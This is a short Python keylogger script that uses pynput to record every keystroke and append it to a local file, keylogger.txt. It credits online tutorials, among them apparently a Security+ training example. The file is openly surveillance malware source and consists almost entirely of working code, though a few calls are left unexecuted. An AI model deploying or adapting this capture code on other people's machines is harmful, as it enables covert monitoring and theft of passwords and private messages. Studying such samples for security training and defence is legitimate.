#!/usr/bin/python3
# -*- coding: utf-8 -*-

# #############################################
# EBID/Bernd Scholler, April 2022
# CODE BASED ON THIS EXAMPLES:
# https://www.thepythoncode.com/code/write-a-keylogger-python
# https://github.com/davidbombal/CompTIA-Security-Plus/blob/main/python-keylogger
# #############################################

from pynput.keyboard import Key, Listener
from datetime import datetime
import re

# ##############################################
# Config
# ##############################################
KEYFILE = 'keylogger.txt'
currstr = ''
ldt     = datetime.now()
cdt     = datetime.now()

# ##############################################
# FUNCTIONS
# ##############################################
def on_release_callback(key):
    pass

def on_press_callback(key):
    global currstr, ldt, cdt
    cdt = datetime.now()
    diff = cdt.timestamp() - ldt.timestamp()
    if diff > 10.0:
        saveToFile(currstr+"\r\n")
        currstr = ''
        ldt = datetime.now()
    
    s = str(key)
    l = len(s)
    x = ''
    if l == 3:
        x = s[1]
    elif s == 'Key.space':
        x = ' '
    elif s == 'Key.backspace':
        x = '↞'
    elif s == 'Key.left':
        x = '←'
    elif s == 'Key.right':
        x = '→'
    elif s == 'Key.up':
        x = '↑'
    elif s == 'Key.down':
        x = '↓'
    elif s == 'Key.enter':
        x = "\r\n"
    elif s == 'Key.esc':
        saveToFile(currstr+"\r\n")
        exit()
    elif s == 'Key.shift' or s == 'Key.shift_r':
        x = ''
    else:
        x = ' [['+s+']] '
    currstr += x

def resetFile():
    ff = open(KEYFILE,'w')
    ff.write('')
    ff.close

def saveToFile(txt):
    ff = open(KEYFILE,'a')
    ff.write(txt)
    ff.close

# ##############################################
# MAIN
# ##############################################
# Reset keylogger.txt
resetFile

# Start Listener
ll = Listener(on_press = on_press_callback, on_release = on_release_callback)
ll.start()
ll.join()

